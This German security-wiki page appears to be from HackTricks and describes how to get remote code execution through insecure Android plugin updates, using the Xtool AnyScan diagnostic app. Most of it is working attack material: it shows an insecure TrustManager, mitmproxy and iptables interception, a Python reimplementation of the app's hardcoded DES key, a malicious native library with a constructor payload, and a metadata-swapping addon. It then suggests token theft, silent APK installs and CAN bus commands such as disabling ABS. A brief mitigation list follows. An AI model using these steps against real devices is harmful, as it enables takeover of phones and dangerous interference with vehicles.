# Unsichere In-App-Update-Mechanismen – Remote Code Execution über bösartige Plugins

{{#include ../../banners/hacktricks-training.md}}

Viele Android-Anwendungen implementieren ihre **eigenen „Plugin“- oder „dynamischen Feature“-Updatekanäle** anstelle der Verwendung des Google Play Stores. Wenn die Implementierung unsicher ist, kann ein Angreifer, der den Datenverkehr abfängt, **willkürlichen nativen Code bereitstellen, der im App-Prozess geladen wird**, was zu vollständiger Remote Code Execution (RCE) auf dem Gerät führt – und in einigen Fällen auf jedem externen Gerät, das von der App gesteuert wird (Autos, IoT, medizinische Geräte …).

Diese Seite fasst eine reale Schwachstellenkette zusammen, die in der Xtool **AnyScan** Automobil-Diagnose-App (v4.40.11 → 4.40.40) gefunden wurde, und verallgemeinert die Technik, damit Sie andere Android-Apps prüfen und die Fehlkonfiguration während eines Red-Team-Einsatzes ausnutzen können.

---
## 1. Identifizierung eines unsicheren TLS TrustManagers

1. Decompilieren Sie die APK mit jadx / apktool und lokalisieren Sie den Netzwerk-Stack (OkHttp, HttpUrlConnection, Retrofit…).
2. Suchen Sie nach einem **benutzerdefinierten `TrustManager`** oder `HostnameVerifier`, der jedes Zertifikat blind vertraut:
```java
public static TrustManager[] buildTrustManagers() {
return new TrustManager[]{
new X509TrustManager() {
public void checkClientTrusted(X509Certificate[] chain, String authType) {}
public void checkServerTrusted(X509Certificate[] chain, String authType) {}
public X509Certificate[] getAcceptedIssuers() {return new X509Certificate[]{};}
}
};
}
```
3. Wenn vorhanden, akzeptiert die Anwendung **jedes TLS-Zertifikat** → Sie können einen transparenten **MITM-Proxy** mit einem selbstsignierten Zertifikat ausführen:
```bash
mitmproxy -p 8080 -s addon.py  # see §4
iptables -t nat -A OUTPUT -p tcp --dport 443 -j REDIRECT --to-ports 8080  # on rooted device / emulator
```
## 2. Reverse-Engineering der Update-Metadaten

Im Fall von AnyScan löst jeder App-Start einen HTTPS GET an:
```
https://apigw.xtoolconnect.com/uhdsvc/UpgradeService.asmx/GetUpdateListEx
```
Der Antwortkörper ist ein **XML-Dokument**, dessen `<FileData>`-Knoten **Base64-kodiertes, DES-ECB-verschlüsseltes** JSON enthalten, das jedes verfügbare Plugin beschreibt.

Typische Jagdschritte:
1. Lokalisieren Sie die Krypto-Routine (z.B. `RemoteServiceProxy`) und stellen Sie wieder her:
* Algorithmus (DES / AES / RC4 …)
* Betriebsmodus (ECB / CBC / GCM …)
* fest codierter Schlüssel / IV (häufig 56-Bit-DES-Schlüssel oder 128-Bit-AES-Schlüssel in Konstanten)
2. Implementieren Sie die Funktion in Python neu, um die Metadaten zu entschlüsseln / zu verschlüsseln:
```python
from Crypto.Cipher import DES
from base64 import b64decode, b64encode

KEY = IV = b"\x2A\x10\x2A\x10\x2A\x10\x2A"  # 56-bit key observed in AnyScan

def decrypt_metadata(data_b64: str) -> bytes:
cipher = DES.new(KEY, DES.MODE_ECB)
return cipher.decrypt(b64decode(data_b64))

def encrypt_metadata(plaintext: bytes) -> str:
cipher = DES.new(KEY, DES.MODE_ECB)
return b64encode(cipher.encrypt(plaintext.ljust((len(plaintext)+7)//8*8, b"\x00"))).decode()
```
## 3. Erstellen Sie ein bösartiges Plugin

1. Wählen Sie eine beliebige legitime Plugin-ZIP-Datei aus und ersetzen Sie die native Bibliothek durch Ihre Nutzlast:
```c
// libscan_x64.so – constructor runs as soon as the library is loaded
__attribute__((constructor))
void init(void){
__android_log_print(ANDROID_LOG_INFO, "PWNED", "Exploit loaded! uid=%d", getuid());
// spawn reverse shell, drop file, etc.
}
```

```bash
$ aarch64-linux-android-gcc -shared -fPIC payload.c -o libscan_x64.so
$ zip -r PWNED.zip libscan_x64.so assets/ meta.txt
```
2. Aktualisieren Sie die JSON-Metadaten, sodass `"FileName" : "PWNED.zip"` und `"DownloadURL"` auf Ihren HTTP-Server zeigen.
3. DES-verschlüsseln + Base64-codieren Sie das modifizierte JSON und fügen Sie es zurück in die abgefangene XML ein.

## 4. Übermitteln Sie die Nutzlast mit mitmproxy

`addon.py` Beispiel, das die ursprünglichen Metadaten *stillschweigend* austauscht:
```python
from mitmproxy import http
MOD_XML = open("fake_metadata.xml", "rb").read()

def request(flow: http.HTTPFlow):
if b"/UpgradeService.asmx/GetUpdateListEx" in flow.request.path:
flow.response = http.Response.make(
200,
MOD_XML,
{"Content-Type": "text/xml"}
)
```
Führen Sie einen einfachen Webserver aus, um die bösartige ZIP-Datei zu hosten:
```bash
python3 -m http.server 8000 --directory ./payloads
```
Wenn das Opfer die App startet, wird sie:
* unser gefälschtes XML über den MITM-Kanal abrufen;
* es mit dem fest codierten DES-Schlüssel entschlüsseln und parsen;
* `PWNED.zip` herunterladen → im privaten Speicher entpacken;
* `dlopen()` die enthaltene *libscan_x64.so* aufrufen und sofort unseren Code **mit den Berechtigungen der App** (Kamera, GPS, Bluetooth, Dateisystem, …) ausführen.

Da das Plugin auf der Festplatte zwischengespeichert ist, **besteht die Hintertür über Neustarts hinweg** und wird jedes Mal ausgeführt, wenn der Benutzer die zugehörige Funktion auswählt.

## 5. Ideen zur Nachnutzung

* Stehlen Sie Sitzungscookies, OAuth-Token oder JWTs, die von der App gespeichert werden.
* Legen Sie eine zweite APK in der zweiten Phase ab und installieren Sie sie stillschweigend über `pm install` (die App hat bereits `REQUEST_INSTALL_PACKAGES`).
* Missbrauchen Sie jede verbundene Hardware – im AnyScan-Szenario können Sie beliebige **OBD-II / CAN-Bus-Befehle** senden (Türen entriegeln, ABS deaktivieren usw.).

---
### Erkennungs- und Minderungsliste (blaue Gruppe)

* Versenden Sie NIEMALS eine Produktionsversion mit einem benutzerdefinierten TrustManager/HostnameVerifier, der die Zertifikatsvalidierung deaktiviert.
* Laden Sie keinen ausführbaren Code von außerhalb des Google Play Store herunter. Wenn Sie *müssen*, signieren Sie jedes Plugin mit demselben **apkSigning v2**-Schlüssel und überprüfen Sie die Signatur vor dem Laden.
* Ersetzen Sie schwache/fest codierte Kryptografie durch **AES-GCM** und einen serverseitigen rotierenden Schlüssel.
* Validieren Sie die Integrität heruntergeladener Archive (Signatur oder mindestens SHA-256).

---
## Referenzen

- [NowSecure – Remote Code Execution Discovered in Xtool AnyScan App](https://www.nowsecure.com/blog/2025/07/16/remote-code-execution-discovered-in-xtool-anyscan-app-risks-to-phones-and-vehicles/)
- [Android – Unsafe TrustManager patterns](https://developer.android.com/privacy-and-security/risks/unsafe-trustmanager)

{{#include ../../banners/hacktricks-training.md}}
